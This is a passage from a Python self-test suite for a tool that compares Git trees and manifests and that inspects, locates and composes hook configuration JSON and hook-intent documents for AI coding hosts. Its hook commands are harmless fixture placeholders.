            pinned_result["pass"],
            f"pinned expectation comparison: {pinned_result}",
        )
        self_test_require(
            pinned_result["activation_profile"]["mode"] == "pinned",
            "pinned activation profile provenance",
        )
        checks.append("activation-profile-provenance")

        dot_expected = root / "dot-activation-expected.md"
        dot_expected.write_text(
            expected_report("- (none)", "."),
            encoding="utf-8",
        )
        self_test_expect_value_error(
            lambda: compare_expectations(produced, dot_expected),
            "dot activation-profile header",
        )
        dot_process = subprocess.run(
            [
                sys.executable,
                str(Path(__file__).resolve()),
                "compare-expectation",
                str(produced),
                str(dot_expected),
            ],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            check=False,
        )
        self_test_require(
            dot_process.returncode == 2,
            "dot activation-profile CLI exit code",
        )
        try:
            dot_error = json.loads(dot_process.stdout.decode("utf-8"))
        except (UnicodeError, json.JSONDecodeError) as error:
            raise ValueError(
                "self-test failed: dot activation-profile error is not JSON"
            ) from error
        self_test_require(
            isinstance(dot_error, dict)
            and isinstance(dot_error.get("error"), str),
            "dot activation-profile JSON error",
        )
        checks.append("activation-dot-json-error")
        activation_target = root / "activation-target"
        activation_target.mkdir()
        linked_profile = activation_target / "profile.json"
        linked_profile.write_bytes(activation_profile.read_bytes())
        activation_link = root / "activation-link"
        try:
            os.symlink(
                activation_target,
                activation_link,
                target_is_directory=True,
            )
        except (NotImplementedError, OSError):
            checks.append("activation-profile-no-follow-skipped")
        else:
            linked_expected = root / "linked-expected.md"
            linked_expected.write_text(
                "- activation profile: activation-link/profile.json\n",
                encoding="utf-8",
            )
            self_test_expect_value_error(
                lambda: expectation_activation_profile(
                    linked_expected,
                    normalized_text(linked_expected),
                ),
                "linked activation-profile parent",
            )
            checks.append("activation-profile-no-follow")
        self_test_require(inspect_tree(master)["safe"], "safe tree inspection")

        repository = root / "git-tree"
        repository.mkdir()
        self_test_require(
            Path(os.environ["GIT_CONFIG_GLOBAL"])
            == git_isolation["global"]
            and Path(os.environ["GIT_CONFIG_SYSTEM"])
            == git_isolation["system"]
            and os.environ["GIT_CONFIG_NOSYSTEM"] == "1"
            and os.environ["GIT_CONFIG_COUNT"] == "1"
            and os.environ["GIT_CONFIG_KEY_0"] == "core.hooksPath"
            and Path(os.environ["GIT_CONFIG_VALUE_0"])
            == git_isolation["hooks"],
            "self-test Git environment controls",
        )
        git_run(
            repository,
            [
                "init",
                "--quiet",
                f"--template={git_isolation['template']}",
            ],
        )
        git_run(repository, ["config", "core.filemode", "false"])
        ambient_user = git_run(
            repository,
            ["config", "--get", "user.name"],
            allow_failure=True,
        )
        self_test_require(
            ambient_user.returncode == 1,
            "ambient Git user config isolation",
        )
        local_injection = git_run(
            repository,
            [
                "config",
                "--local",
                "--get-regexp",
                r"^(include|core\.hooksPath)",
            ],
            allow_failure=True,
        )
        self_test_require(
            local_injection.returncode == 1,
            "self-test local Git config isolation",
        )
        self_test_require(
            not (repository / ".git" / "hooks" / "pre-commit").exists(),
            "self-test Git template hook isolation",
        )
        source_unit = repository / "source"
        projection_unit = repository / "projection"
        deletion_unit = repository / "normal-deletion"
        source_unit.mkdir()
        projection_unit.mkdir()
        deletion_unit.mkdir()
        (source_unit / "tool").write_bytes(b"same\n")
        (projection_unit / "tool").write_bytes(b"same\n")
        (deletion_unit / "file").write_bytes(b"tracked\n")
        git_run(
            repository,
            [
                "add",
                "--",
                "source/tool",
                "projection/tool",
                "normal-deletion/file",
            ],
        )
        git_run(
            repository, ["update-index", "--chmod=+x", "--", "source/tool"]
        )
        git_run(
            repository,
            ["update-index", "--chmod=-x", "--", "projection/tool"],
        )
        mode_comparison = compare_git_trees(
            repository,
            "source",
            "projection",
            revision=None,
            include_untracked=False,
        )
        self_test_require(
            not mode_comparison["equal"],
            "Git mode-only inequality",
        )
        self_test_require(
            mode_comparison["comparable"],
            "Git mode-only comparability",
        )
        self_test_require(
            not mode_comparison["blockers"],
            "Git mode-only blocker absence",
        )
        self_test_require(
            mode_comparison["changed"][0]["kind"] == "mode-only",
            "Git mode-only classification",
        )

        untracked_unit = repository / "untracked"
        untracked_unit.mkdir()
        (untracked_unit / "tool").write_bytes(b"untracked\n")
        ordinary_manifest = git_manifest(
            repository,
            "untracked",
            revision=None,
            include_untracked=True,
        )
        self_test_require(
            ordinary_manifest["safe"],
            "ordinary untracked manifest safety",
        )
        self_test_require(
            not ordinary_manifest["mode_limited"],
            "ordinary untracked mode availability",
        )
        self_test_require(
            ordinary_manifest["entries"][0]["mode"] == "100644",
            "ordinary untracked default mode",
        )
        self_test_require(
            ordinary_manifest["entries"][0]["mode_evidence"][
                "effective_source"
            ]
            == "platform-untracked-default",
            "ordinary untracked mode evidence",
        )

        explicit_manifest = git_manifest(
            repository,
            "untracked",
            revision=None,
            include_untracked=True,
            required_executable=["tool"],
        )
        self_test_require(
            explicit_manifest["mode_limited"],
            "explicit executable mode limitation",
        )
        self_test_require(
            any(
                blocker["token"] == "mode-limited"
                for blocker in explicit_manifest["blockers"]
            ),
            "explicit executable mode blocker",
        )

        prospective_unit = repository / "prospective"
        prospective_unit.mkdir()
        (prospective_unit / "tool").write_bytes(b"same\n")
        observe_comparison = compare_git_trees(
            repository,
            "source",
            "prospective",
            revision=None,
            include_untracked=True,
        )
        self_test_require(
            observe_comparison["comparable"],
            "observe comparison comparability",
        )
        self_test_require(
            not observe_comparison["blockers"],
            "observe comparison blocker absence",
        )
        directed_comparison = compare_git_trees(
            repository,
            "source",
            "prospective",
            revision=None,
            include_untracked=True,
            direction="source-to-projection",
        )
        self_test_require(
            not directed_comparison["comparable"],
            "directed comparison mode-limited comparability",
        )
        self_test_require(
            directed_comparison["mode_limited"],
            "directed comparison mode limitation",
        )
        self_test_require(
            any(
                blocker["token"] == "mode-limited"
                and blocker["side"] == "projection"
                for blocker in directed_comparison["blockers"]
            ),
            "directed comparison target mode blocker",
        )

        git_run(
            repository,
            [
                "commit",
                "--quiet",
                "--no-gpg-sign",
                "--no-verify",
                "-m",
                "baseline",
            ],
        )
        checks.append("git-self-test-process-isolation")

        head_tree_oid = (
            git_run(repository, ["rev-parse", "HEAD^{tree}"])
            .stdout.decode("ascii")
            .strip()
        )
        for non_commit_revision in (
            "HEAD^{tree}",
            "HEAD:projection",
            "HEAD:",
            head_tree_oid,
        ):
            self_test_expect_value_error(
                lambda value=non_commit_revision: git_manifest(
                    repository,
                    "projection",
                    revision=value,
                    include_untracked=False,
                ),
                f"non-commit revision {non_commit_revision}",
            )
        self_test_expect_value_error(
            lambda: compare_git_trees(
                repository,
                "source",
                "projection",
                revision="HEAD:projection",
                include_untracked=False,
            ),
            "subtree revision comparison",
        )
        checks.append("revision-commit-only")

        revision_manifest = git_manifest(
            repository,
            "projection",
            revision="HEAD",
            include_untracked=False,
        )
        (projection_unit / "tool").write_bytes(b"worktree\n")
        worktree_manifest = git_manifest(
            repository,
            "projection",
            revision=None,
            include_untracked=False,
        )
        snapshot_comparison = compare_git_manifests(
            revision_manifest, worktree_manifest
        )
        self_test_require(
            re.fullmatch(
                r"(?:[0-9a-f]{40}|[0-9a-f]{64})",
                revision_manifest["resolved_commit"],
            )
            is not None,
            "resolved revision commit object id",
        )
        self_test_require(
            not snapshot_comparison["equal"],
            "revision versus worktree inequality",
        )
        self_test_require(
            snapshot_comparison["changed"][0]["kind"] == "bytes-only",
            "revision versus worktree byte classification",
        )

        blob_oid = git_run(
            repository,
            ["hash-object", "-w", "--stdin"],
            input_data=b"literal path identity\n",
        ).stdout.decode("ascii").strip()
        literal_unit_tree = git_run(
            repository,
            ["mktree", "-z"],
            input_data=(
                f"100644 blob {blob_oid}\t".encode("ascii")
                + b"literal\\name\0"
            ),
        ).stdout.decode("ascii").strip()
        nested_leaf_tree = git_run(
            repository,
            ["mktree", "-z"],
            input_data=(
                f"100644 blob {blob_oid}\tname\0".encode("ascii")
            ),
        ).stdout.decode("ascii").strip()
        nested_unit_tree = git_run(
            repository,
            ["mktree", "-z"],
            input_data=(
                f"040000 tree {nested_leaf_tree}\tliteral\0".encode(
                    "ascii"
                )
            ),
        ).stdout.decode("ascii").strip()

        def root_tree(unit_tree: str) -> str:
            return (
                git_run(
                    repository,
                    ["mktree", "-z"],
                    input_data=(
                        f"040000 tree {unit_tree}\tliteral-unit\0".encode(
                            "ascii"
                        )
                    ),
                )
                .stdout.decode("ascii")
                .strip()
            )

        literal_commit = (
            git_run(
                repository,
                ["commit-tree", root_tree(literal_unit_tree)],
                input_data=b"literal backslash path\n",
            )
            .stdout.decode("ascii")
            .strip()
        )
        nested_commit = (
            git_run(
                repository,
                ["commit-tree", root_tree(nested_unit_tree)],
                input_data=b"nested slash path\n",
            )
            .stdout.decode("ascii")
            .strip()
        )
        literal_manifest = git_manifest(
            repository,
            "literal-unit",
            revision=literal_commit,
            include_untracked=False,
        )
        nested_manifest = git_manifest(
            repository,
            "literal-unit",
            revision=nested_commit,
            include_untracked=False,
        )
        self_test_require(
            literal_manifest["entries"][0]["path"]
            == "literal\\name",
            "literal Git backslash path preservation",
        )
        literal_comparison = compare_git_manifests(
            literal_manifest,
            nested_manifest,
        )
        self_test_require(
            not literal_comparison["equal"]
            and literal_comparison["source_only"] == ["literal\\name"]
            and literal_comparison["projection_only"] == ["literal/name"],
            "literal backslash and slash path identity separation",
        )
        checks.append("git-literal-backslash-identity")

        (deletion_unit / "file").unlink()
        deletion_manifest = git_manifest(
            repository,
            "normal-deletion",
            revision=None,
            include_untracked=True,
        )
        self_test_require(
            deletion_manifest["safe"],
            "tracked deletion manifest safety",
        )
        self_test_require(
            deletion_manifest["tracked_deletions"] == ["file"],
            "tracked deletion preservation",
        )

        collision_blockers: list[dict[str, str]] = []
        detect_unit_casefold_collisions(
            ["foo", "foo"], ["Foo", "Foo"], collision_blockers
        )
        collision_safe = not collision_blockers
        self_test_require(
            not collision_safe,
            "deleted/current case-fold collision safety",
        )
        self_test_require(
            len(collision_blockers) == 1,
            "deleted/current collision blocker count",
        )
        self_test_require(
            collision_blockers[0]["token"] == "unsafe-tree-entry",
            "deleted/current collision blocker token",
        )
        self_test_require(
            collision_blockers[0]["detail"].startswith(
                "case-fold-collision"
            ),
            "deleted/current collision blocker detail",
        )
        no_false_positive: list[dict[str, str]] = []
        detect_unit_casefold_collisions(
            ["same"], ["same"], no_false_positive
        )
        self_test_require(
            not no_false_positive,
            "identical deleted/current path collision false positive",
        )

        if os.name != "nt":
            git_run(repository, ["config", "core.filemode", "true"])
            posix_unit = repository / "posix-untracked"
            posix_unit.mkdir()
            (posix_unit / "tool").write_bytes(b"executable\n")
            os.chmod(posix_unit / "tool", 0o755)
            posix_manifest = git_manifest(
                repository,
                "posix-untracked",
                revision=None,
                include_untracked=True,
            )
            self_test_require(
                posix_manifest["safe"],
                "POSIX untracked executable manifest safety",
            )
            self_test_require(
                posix_manifest["entries"][0]["mode"] == "100755",
                "POSIX untracked executable mode",
            )
            self_test_require(
                posix_manifest["entries"][0]["mode_evidence"][
                    "effective_source"
                ]
                == "posix-filesystem-exec",
                "POSIX untracked executable evidence",
            )
            checks.append("posix-untracked-exec")
        else:
            checks.append("posix-untracked-exec-skipped")
    checks.append("compare-trees")
    checks.append("inspect-tree")
    checks.append("git-tree-mode-only")
    checks.append("ordinary-untracked-100644")
    checks.append("explicit-exec-mode-limited")
    checks.append("directional-mode-limited")
    checks.append("observe-mode-nonblocking")
    checks.append("revision-vs-worktree")
    checks.append("tracked-deletion-preserved")
    checks.append("deleted-current-casefold-collision")
    checks.append("compare-expectation")

    hooks_carrier = (
        b"{\n"
        b'  "permissions": {\n'
        b'    "allow": []\n'
        b"  },\n"
        b'  "hooks": {\n'
        b'    "PreToolUse": [\n'
        b"      {\n"
        b'        "matcher": "Bash",\n'
        b'        "hooks": [\n'
        b'          { "type": "command", "command":'
        b' "bridge-fixture-noop guard", "timeout": 5,'
        b' "statusMessage": "[bridge:guard]" }\n'
        b"        ]\n"
        b"      }\n"
        b"    ],\n"
        b'    "Stop": [\n'
        b"      {\n"
        b'        "hooks": [\n'
        b'          { "type": "command", "command":'
        b' "bridge-fixture-noop stop" }\n'
        b"        ]\n"
        b"      }\n"
        b"    ]\n"
        b"  }\n"
        b"}\n"
    )
    carrier_scan = inspect_hooks_json(hooks_carrier, host="claude")
    self_test_require(
        carrier_scan["ok"] and not carrier_scan["anomalies"],
        "hooks carrier inspection",
    )
    self_test_require(
        carrier_scan["top_level_keys"] == ["permissions", "hooks"],
        "hooks carrier top-level key order",
    )
    self_test_require(
        [event["event"] for event in carrier_scan["events"]]
        == ["PreToolUse", "Stop"],
        "hooks carrier event order",
    )
    guard_group = carrier_scan["events"][0]["groups"][0]
    self_test_require(
        guard_group["matcher"]["present"]
        and guard_group["matcher"]["value"] == "Bash"
        and hooks_carrier[
            guard_group["span"]["start"] : guard_group["span"]["end"]
        ].startswith(b"{\n        \"matcher\""),
        "hooks carrier group span",
    )
    self_test_require(
        guard_group["handlers"][0]["one_line"]
        and guard_group["handlers"][0]["timeout"] == 5
        and guard_group["handlers"][0]["marker_id"] == "guard",
        "hooks carrier handler model",
    )
    self_test_require(
        carrier_scan["markers"]
        == [
            {
                "id": "guard",
                "event": "PreToolUse",
                "group": 0,
                "handler": 0,
            }
        ],
        "hooks carrier marker map",
    )
    self_test_require(
        carrier_scan["style"]["indent"] == "  "
        and carrier_scan["style"]["handler_form"] == "one-line"
        and carrier_scan["style"]["group_indent"] == "      ",
        "hooks carrier style inference",
    )
    checks.append("hooks-json-span-scan")

    parse_error_scan = inspect_hooks_json(b'{"hooks": {,}}')
    self_test_require(
        parse_error_scan["anomalies"] == ["parse-error"]
        and not parse_error_scan["ok"],
        "hooks carrier parse-error anomaly",
    )
    duplicate_scan = inspect_hooks_json(
        b'{"hooks": {"Stop": []}, "hooks": {"Stop": []}}'
    )
    self_test_require(
        duplicate_scan["anomalies"] == ["duplicate-key"]
        and duplicate_scan["duplicate_keys"] == ["hooks"],
        "hooks carrier duplicate-key anomaly",
    )
    unmodelled_scan = inspect_hooks_json(b'{"hooks": {"Stop": {}}}')
    self_test_require(
        unmodelled_scan["anomalies"] == ["unmodelled-shape"],
        "hooks carrier unmodelled-shape anomaly",
    )
    foreign_scan = inspect_hooks_json(
        b'{"hooks": {"Stop": [{"hooks": [{"type": "mcp_tool",'
        b' "server": "s", "tool": "t"}]}]}}',
        host="codex",
    )
    self_test_require(
        foreign_scan["ok"]
        and foreign_scan["events"][0]["groups"][0]["handlers"][0]["type"]
        == "mcp_tool",
        "foreign handler stays readable",
    )
    checks.append("hooks-json-carrier-anomalies")

    located = locate_json_span(
        hooks_carrier, event="PreToolUse", matcher="Bash"
    )
    self_test_require(
        located["ok"]
        and located["kind"] == "group"
        and located["span"] == guard_group["span"]
        and located["handler_count"] == 1
        and located["handler_span"]
        == guard_group["handlers"][0]["span"],
        "owned group and handler span location",
    )
    appended = locate_json_span(
        hooks_carrier, event="PreToolUse", matcher="Edit"
    )
    self_test_require(
        appended["ok"]
        and appended["kind"] == "insertion"
        and appended["level"] == "group"
        and appended["at"] == guard_group["span"]["end"]
        and appended["prefix_bytes"] == ",\n      ",
        "group insertion point",
    )
    new_event = locate_json_span(
        hooks_carrier, event="SessionStart", matcher=None
    )
    self_test_require(
        new_event["ok"]
        and new_event["level"] == "event"
        and new_event["suffix_bytes"] == ",\n    ",
        "ascending event insertion point",
    )
    absent_hooks = locate_json_span(
        b'{\n  "description": "user"\n}\n', event="Stop", matcher=None
    )
    self_test_require(
        absent_hooks["ok"]
        and absent_hooks["level"] == "hooks"
        and absent_hooks["prefix_bytes"] == ",\n  ",
        "hooks member insertion point",
    )
    for query, expected_reason in (
        (
            {"event": "Stop", "matcher": None, "require_existing": True},
            "hooks-key-absent",
        ),
    ):
        strict = locate_json_span(
            b'{\n  "description": "user"\n}\n', **query
        )
        self_test_require(
            not strict["ok"] and strict["reason"] == expected_reason,
            f"locate-json-span {expected_reason}",
        )
    strict_event = locate_json_span(
        hooks_carrier,
        event="SessionStart",
        matcher=None,
        require_existing=True,
    )
    self_test_require(
        not strict_event["ok"] and strict_event["reason"] == "event-absent",
        "locate-json-span event-absent",
    )
    ambiguous = locate_json_span(
        b'{"hooks": {"Stop": [{"matcher": "a", "hooks": []},'
        b' {"matcher": "a", "hooks": []}]}}',
        event="Stop",
        matcher="a",
    )
    self_test_require(
        not ambiguous["ok"]
        and ambiguous["reason"] == "group-ambiguous",
        "locate-json-span group-ambiguous",
    )
    broken_span = locate_json_span(b"{,}", event="Stop", matcher=None)
    self_test_require(
        not broken_span["ok"]
        and broken_span["reason"] == "json-parse-error",
        "locate-json-span json-parse-error",
    )
    checks.append("hooks-json-owned-span-location")

    guard_entry = {
        "id": "guard",
        "event": "PreToolUse",
        "class": "gate",
        "enabled": True,
        "matcher": "Bash",
        "command": "bridge-fixture-noop guard",
        "timeout": 5,
        "targets": {
            "claude": {"surface": "settings-json", "tier": "native"},
            "codex": {"surface": "none", "tier": "declared-unsynced"},
        },
    }
    rendered_group = render_hook_group(
        guard_entry,
        host="claude",
        style=carrier_scan["style"],
        creating=True,
    )
    self_test_require(
        rendered_group
        == hooks_carrier[
            guard_group["span"]["start"] : guard_group["span"]["end"]
        ],
        "converged group renders to the existing bytes",
    )
    multi_line = render_hook_group(
        guard_entry,
        host="claude",
        style=dict(carrier_scan["style"], handler_form="multi-line"),
        creating=True,
    )
    self_test_require(
        b'\n            "type": "command",' in multi_line,
        "multi-line handler render form",
    )
    self_test_expect_value_error(
        lambda: render_hook_group(
            guard_entry,
            host="claude",
            style=dict(carrier_scan["style"], indent="   "),
            creating=True,
        ),
        "hook render indent outside the closed set",
    )
    self_test_expect_value_error(
        lambda: render_hook_group(
            guard_entry,
            host="codex",
            style=carrier_scan["style"],
            creating=True,
        ),
        "rendering a surface with no JSON carrier",
    )
    checks.append("hook-group-canonical-render")

    converged = {
        "host": "claude",
        "groups": [
            {
                "event": "PreToolUse",
                "matcher": "Bash",
                "entry": guard_entry,
            }
        ],
    }
    unchanged_composition = compose_hooks_json(hooks_carrier, converged)
    self_test_require(
        not unchanged_composition["changed"]
        and base64.b64decode(
            unchanged_composition["postimage"]["base64"]
        )
        == hooks_carrier,
        "idempotence law on a converged carrier",
    )
    updated_entry = dict(guard_entry, timeout=30)
    desired = {
        "host": "claude",
        "groups": [
            {
                "event": "PreToolUse",
                "matcher": "Bash",
                "entry": updated_entry,
            },
            {
                "event": "PostToolUse",
                "matcher": "Write",
                "entry": {
                    "id": "fmt",
                    "event": "PostToolUse",
                    "class": "reminder",
                    "enabled": True,
                    "matcher": "Write",
                    "command": "bridge-fixture-noop fmt",
                    "targets": {
                        "claude": {
                            "surface": "settings-json",
                            "tier": "native",
                        },
                        "codex": {
                            "surface": "none",
                            "tier": "declared-unsynced",
                        },
                    },
                },
            },
        ],
    }
    composition = compose_hooks_json(hooks_carrier, desired)
    postimage = base64.b64decode(composition["postimage"]["base64"])
    self_test_require(
        composition["changed"] and postimage != hooks_carrier,
        "composition produces a postimage",
    )
    replay = compose_hooks_json(postimage, desired)
    self_test_require(
        not replay["changed"]
        and base64.b64decode(replay["postimage"]["base64"]) == postimage,
        "composing twice yields identical bytes",
    )
    checks.append("hooks-json-composition-idempotent")

    post_scan = inspect_hooks_json(postimage, host="claude")
    self_test_require(
        post_scan["ok"]
        and post_scan["top_level_keys"] == ["permissions", "hooks"],
        "composition keeps the carrier usable",
    )
    self_test_require(
        postimage[: postimage.index(b'"hooks"')]
        == hooks_carrier[: hooks_carrier.index(b'"hooks"')],
        "unowned top-level bytes preserved",
    )
    stop_before = hooks_carrier[
        carrier_scan["events"][1]["groups"][0]["span"]["start"] : carrier_scan[
            "events"
        ][1]["groups"][0]["span"]["end"]
    ]
    stop_after_event = _event_record(post_scan, "Stop")
    stop_after = postimage[
        stop_after_event["groups"][0]["span"]["start"] : stop_after_event[
            "groups"
        ][0]["span"]["end"]
    ]
    self_test_require(
        stop_before == stop_after, "unowned sibling group preserved"
    )
    self_test_require(
        [event["event"] for event in post_scan["events"]]
        == ["PostToolUse", "PreToolUse", "Stop"],
        "new event member inserted in ascending order",
    )
    checks.append("hooks-json-unowned-bytes-preserved")

    deletion = compose_hooks_json(
        hooks_carrier,
        {
            "host": "claude",
            "groups": [
                {"event": "Stop", "matcher": None, "entry": None}
            ],
        },
    )
    deleted_image = base64.b64decode(deletion["postimage"]["base64"])
    self_test_require(
        b'"Stop"' not in deleted_image
        and b'"PreToolUse"' in deleted_image,
        "emptied event member removed whole",
    )
    emptied = compose_hooks_json(
        hooks_carrier,
        {
            "host": "claude",
            "groups": [
                {"event": "Stop", "matcher": None, "entry": None},
                {
                    "event": "PreToolUse",
                    "matcher": "Bash",
                    "entry": None,
                },
            ],
        },
    )
    self_test_require(
        b'"hooks": {}'
        in base64.b64decode(emptied["postimage"]["base64"]),
        "emptied hooks object retained as {}",
    )
    checks.append("hooks-json-composition-delete")

    self_test_expect_value_error(
        lambda: compose_hooks_json(
            b'{"hooks": {"Stop": [{"hooks": [{"type": "command",'
            b' "command": "a"}, {"type": "command",'
            b' "command": "b"}]}]}}',
            {
                "host": "claude",
                "groups": [
                    {
                        "event": "Stop",
                        "matcher": None,
                        "entry": dict(
                            guard_entry,
                            id="multi",
                            event="Stop",
                            matcher=None,
                        ),
                    }
                ],
            },
        ),
        "composition over a multi-handler owned group",
    )
    self_test_expect_value_error(
        lambda: compose_hooks_json(
            b'{"hooks": {"Stop": [{"hooks": [{"type": "mcp_tool"}]}]}}',
            {
                "host": "claude",
                "groups": [
                    {
                        "event": "Stop",
                        "matcher": None,
                        "entry": dict(
                            guard_entry,
                            id="foreign",
                            event="Stop",
                            matcher=None,
                        ),
                    }
                ],
            },
        ),
        "composition over a foreign handler",
    )
    self_test_expect_value_error(
        lambda: compose_hooks_json(
            hooks_carrier,
            {
                "host": "claude",
                "groups": [
                    {
                        "event": "PreToolUse",
                        "matcher": "Edit",
                        "entry": guard_entry,
                    }
                ],
            },
        ),
        "composition whose matcher contradicts the entry",
    )
    self_test_expect_value_error(
        lambda: compose_hooks_json(
            hooks_carrier,
            {
                "host": "claude",
                "groups": [
                    {
                        "event": "PreToolUse",
                        "matcher": "Bash",
                        "entry": guard_entry,
                    },
                    {
                        "event": "PreToolUse",
                        "matcher": "Bash",
                        "entry": guard_entry,
                    },
                ],
            },
        ),
        "composition with a duplicate desired group",
    )
    duplicate_refusal = False
    try:
        compose_hooks_json(
            b'{"hooks": {"Stop": []}, "hooks": {"Stop": []}}',
            {
                "host": "claude",
                "groups": [
                    {"event": "Stop", "matcher": None, "entry": None}
                ],
            },
        )
    except HooksCarrierError as error:
        duplicate_refusal = error.reason == "duplicate-key"
    self_test_require(
        duplicate_refusal, "composition fails closed on a duplicate key"
    )
    checks.append("hooks-json-composition-refusals")

    suffix_carrier = hooks_carrier.replace(
        b'"statusMessage": "[bridge:guard]"',
        b'"statusMessage": "[bridge:guard] reviewed by the team"',
        1,
    )
    suffix_desired = {
        "host": "claude",
        "groups": [
            {"event": "PreToolUse", "matcher": "Bash", "entry": guard_entry}
        ],
    }
    suffix_composed = compose_hooks_json(suffix_carrier, suffix_desired)
    self_test_require(
        not suffix_composed["changed"]
        and not suffix_composed["edits"]
        and base64.b64decode(suffix_composed["postimage"]["base64"])
        == suffix_carrier,
        "an unowned statusMessage suffix is carried forward: "
        f"{suffix_composed['edits']}",
    )
    marker_free_carrier = suffix_carrier.replace(
        b', "statusMessage": "[bridge:guard] reviewed by the team"', b"", 1
    )
    marker_composed = compose_hooks_json(marker_free_carrier, suffix_desired)
    self_test_require(
        marker_composed["changed"]
        and [
            (edit["kind"], edit["key"])
            for edit in marker_composed["edits"]
        ]
        == [("add-key", "statusMessage")],
        "a handler carrying no statusMessage still receives the marker",
    )
    checks.append("hooks-json-status-message-preserved")

    incomplete_entry = {
        key: value for key, value in guard_entry.items() if key != "command"
    }
    incomplete_desired = {
        "host": "claude",
        "groups": [
            {
                "event": "PreToolUse",
                "matcher": "Bash",
                "entry": incomplete_entry,
            }
        ],
    }
    for label, carrier in (
        ("update", hooks_carrier),
        ("create", b'{"hooks": {}}'),
    ):
        refusal = ""
        try:
            compose_hooks_json(carrier, incomplete_desired)
        except ValueError as error:
            refusal = str(error)
        self_test_require(
            refusal.startswith("composition-refused:missing-command"),
            f"the {label} path refuses an entry with no command: {refusal}",
        )
    checks.append("hooks-json-missing-command-refusal")

    float_scan = inspect_hooks_json(
        b'{"hooks": {"Stop": [{"hooks": [{"type": "command",'
        b' "command": "bridge-fixture-noop stop", "timeout": 1.5}]}]}}',
        host="claude",
    )
    float_handler = float_scan["events"][0]["groups"][0]["handlers"][0]
    self_test_require(
        float_scan["ok"]
        and not float_scan["anomalies"]
        and [
            (key["name"], key["scalar"]) for key in float_handler["keys"]
        ]
        == [("type", True), ("command", True), ("timeout", False)]
        and float_handler["timeout"] is None,
        "a floating-point handler member is outside the closed scalar set: "
        f"{float_handler['keys']}",
    )
    checks.append("hook-handler-non-scalar-number")

    intent_document = (
        b"<!-- bridge:hooks-shared-execution 2026-09-07 acknowledged:"
        b" committed Claude hooks run for every clone without a trust"
        b" prompt -->\n"
        b"\n"
        b"# Hook intents\n"
        b"\n"
        b"## hook: reminder-start\n"
        b"\n"
        b"- Trigger: at session start.\n"
        b"- Purpose: state the branch.\n"
        b"- Command: print the branch name.\n"
        b"- Environment: git in PATH; read-only.\n"
        b"- Failure policy: best-effort.\n"
        b"\n"
        b"```yaml\n"
        b"id: reminder-start\n"
        b"event: SessionStart\n"
        b"class: reminder\n"
        b"enabled: true\n"
        b"command: bridge-fixture-noop start\n"
        b"timeout: 5\n"
        b"targets:\n"
        b"  claude:\n"
        b"    surface: settings-json\n"
        b"    tier: native\n"
        b"  codex:\n"
        b"    surface: codex-hooks-json\n"
        b"    tier: native\n"
        b"intent:\n"
        b"  - date: 2026-09-07\n"
        b"    note: initial declaration\n"
        b"```\n"
    )
    intent_scan = inspect_hook_intents(intent_document)
    self_test_require(
        intent_scan["valid"] and len(intent_scan["entries"]) == 1,
        f"valid v5 intent document: {intent_scan['anomalies']}",
    )
    entry_scan = intent_scan["entries"][0]
    self_test_require(
        intent_scan["shared_execution"]["present"]
        and intent_scan["shared_execution"]["date"] == "2026-09-07",
        "file-level shared-execution acknowledgement",
    )
    self_test_require(
        [item["label"] for item in entry_scan["bullets"]]
        == list(HOOK_BULLET_LABELS),
        "five prose bullets in order",
    )
    self_test_require(
        entry_scan["authenticated"]
        == [
            {
                "host": "claude",
                "surface": "settings-json",
                "tier": "native",
            },
            {
                "host": "codex",
                "surface": "codex-hooks-json",
                "tier": "native",
            },
        ],
        "authenticated triple per target",
    )
    self_test_require(
        entry_scan["event_verified"] and not entry_scan["advisories"],
        "shared event carries no advisory",
    )
    self_test_require(
        intent_scan["event_registry"] == "shared-events/2026-09-07",
        "dated shared-event registry name",
    )
    checks.append("hook-intent-scan-v5")

    def scan_reasons(replacement: bytes, original: bytes) -> set:
        mutated = intent_document.replace(original, replacement, 1)
        return {
            anomaly["reason"]
            for anomaly in inspect_hook_intents(mutated)["anomalies"]
        }

    self_test_require(
        "class-missing"
        in scan_reasons(b"", b"class: reminder\n"),
        "class-missing anomaly",
    )
    self_test_require(
        "bullet-missing"
        in scan_reasons(b"", b"- Purpose: state the branch.\n"),
        "bullet-missing anomaly",
    )
    unacknowledged_scan = inspect_hook_intents(
        intent_document.replace(
            b"<!-- bridge:hooks-shared-execution 2026-09-07 acknowledged:"
            b" committed Claude hooks run for every clone without a trust"
            b" prompt -->\n",
            b"",
            1,
        )
    )
    unacknowledged_entry = unacknowledged_scan["entries"][0]
    self_test_require(
        unacknowledged_scan["valid"]
        and not unacknowledged_scan["shared_execution"]["present"]
        and unacknowledged_entry["valid"]
        and unacknowledged_entry["shared_execution_required"]
        and unacknowledged_entry["lints"]
        == ["shared-execution-unacknowledged"]
        and len(unacknowledged_entry["authenticated"]) == 2
        and unacknowledged_scan["lints"]
        == [
            {
                "reason": "shared-execution-unacknowledged",
                "entry": "reminder-start",
                "line": unacknowledged_entry["yaml_line"],
            }
        ],
        "shared-execution-unacknowledged never invalidates an entry",
    )
    self_test_require(
        "tier-unsupported-event"
        in scan_reasons(b"event: Interrupt\n", b"event: SessionStart\n"),
        "tier-unsupported-event anomaly",
    )
    self_test_require(
        "timeout-out-of-range"
        in scan_reasons(b"timeout: 900\n", b"timeout: 5\n"),
        "timeout-out-of-range anomaly",
    )
    self_test_require(
        "matcher-domain"
        in scan_reasons(
            b"timeout: 5\nmatcher: bogus\n", b"timeout: 5\n"
        ),
        "matcher-domain anomaly",
    )
    self_test_require(
        "surface-host-mismatch"
        in scan_reasons(
            b"    surface: agents-md\n", b"    surface: settings-json\n"
        ),
        "surface-host-mismatch anomaly",
    )
    self_test_require(
        "tier-surface-mismatch"
        in scan_reasons(
            b"    surface: none\n", b"    surface: settings-json\n"
        ),
        "tier-surface-mismatch anomaly",
    )
    self_test_require(
        "override-without-reason"
        in scan_reasons(
            b"    tier: native\n    matcher: Bash\n",
            b"    tier: native\n",
        ),
        "override-without-reason anomaly",
    )
    self_test_require(
        "reason-without-override"
        in scan_reasons(
            b"    tier: native\n    override-reason: matcher-grammar\n",
            b"    tier: native\n",
        ),
        "reason-without-override anomaly",
    )
    self_test_require(
        "unrecognized-field"
        in scan_reasons(b"unknown-key: value\n", b"timeout: 5\n"),
        "unrecognized-field anomaly",
    )
    self_test_require(
        "yaml-block-count"
        in scan_reasons(b"```\n```yaml\n```\n", b"```\n"),
        "yaml-block-count anomaly",
    )
    self_test_require(
        "degradation-ineligible"
        in scan_reasons(
            b"    surface: agents-md\n    tier: semantic\n",
            b"    surface: codex-hooks-json\n    tier: native\n",
        ),
        "degradation-ineligible anomaly",
    )
    self_test_require(
